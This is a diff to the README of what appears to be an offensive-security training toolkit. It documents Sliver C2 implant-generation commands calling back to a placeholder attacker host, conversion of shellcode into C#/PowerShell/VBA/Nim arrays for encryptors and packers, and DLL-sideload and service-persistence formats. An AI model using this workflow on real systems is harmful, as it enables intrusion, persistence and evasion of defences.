@@ -51,27 +51,30 @@ The `generate` output format maps directly onto the existing osep-tools loaders:
 
 | `--format` | Output | Feed it into |
 |---|---|---|
-| `shellcode` | Raw PIC shellcode (MBs — full Go implant) | `sliver2arrays.py` → AES/XOR/VBA encryptors, NimSyscallPacker |
-| `raw` | Standalone `.exe` | Direct delivery, or re-pack with NimSyscallPacker |
-| `csharp` | C# `byte[]` array | `aes-shellcode-encryption.cs` |
-| `ps1` | PowerShell `[Byte[]]` array | `ps-shellcode-runner.ps1` |
-| `nim` | Nim `array[.., byte]` | A Nim loader |
+| `exe` | Standalone executable (PE / ELF / Mach-O, per `--os`) | Direct delivery, or re-pack with NimSyscallPacker |
+| `shared` | Dynamic library / DLL | DLL sideload / reflective load |
 | `service` | Windows service binary | Persistence |
-| `shared-library` | DLL | DLL sideload / reflective load |
+| `shellcode` | Raw PIC shellcode (MBs — full Go implant) | `sliver2arrays.py` → C#/PowerShell/VBA/Nim arrays, AES/XOR encryptors, NimSyscallPacker |
+| `archive` | Go c-archive | Custom C host |
 
 ### Examples
 
 ```text
-# Full implant as raw shellcode (large — a fixed 4KB alloc would fail, the
-# loaders now allocate shellcode.Length)
+# Raw PIC shellcode (→ sliver2arrays.py for C#/PowerShell/VBA/Nim arrays, or → NimSyscallPacker)
 sliver > generate --mtls <LHOST>:8888 --format shellcode --save /tmp/sc.bin
 
-# Directly as C# / PowerShell arrays
-sliver > generate --mtls <LHOST>:8888 --format csharp --save /tmp/sc.cs
-sliver > generate --mtls <LHOST>:8888 --format ps1   --save /tmp/sc.ps1
+# Convert raw shellcode into a C# / PowerShell / VBA / Nim byte array:
+python3 sliver/sliver2arrays.py /tmp/sc.bin --csharp
+python3 sliver/sliver2arrays.py /tmp/sc.bin --ps1
+python3 sliver/sliver2arrays.py /tmp/sc.bin --vba
+python3 sliver/sliver2arrays.py /tmp/sc.bin --nim
 
 # Standalone EXE
-sliver > generate --mtls <LHOST>:8888 --format raw --save /tmp/implant.exe
+sliver > generate --mtls <LHOST>:8888 --format exe --save /tmp/implant.exe
+
+# Windows service binary / DLL
+sliver > generate --mtls <LHOST>:8888 --format service --save /tmp/svc.exe
+sliver > generate --mtls <LHOST>:8888 --format shared  --save /tmp/implant.dll
 ```
 
 ### Sizing note (important)
@@ -139,10 +142,10 @@ python3 sliver/sliver2arrays.py /tmp/sc.bin --all
 #   ln -s "$(pwd)/sliver/sliver2arrays.py" ~/.local/bin/sliver2arrays
 ```
 
-> Tip: for C# and PowerShell loaders you usually don't need this — Sliver's
-> `--format csharp` / `--format ps1` already emit the array. The converter is
-> mainly for `--format shellcode` (raw binary) and for VBA `Array(...)`, which
-> Sliver does not emit directly.
+> Sliver has no `csharp` / `ps1` / `nim` / `vba` output formats — `generate --format`
+> only accepts `exe`, `shared`, `service`, `archive`, or `shellcode`. To get a
+> C#/PowerShell/VBA/Nim byte array, always generate `--format shellcode` and convert
+> it with `sliver2arrays.py`.
 
 Then paste the output into the matching encryptor/loader (e.g. feed the C#
 output into `aes-shellcode-encryption.cs`, the VBA output into the
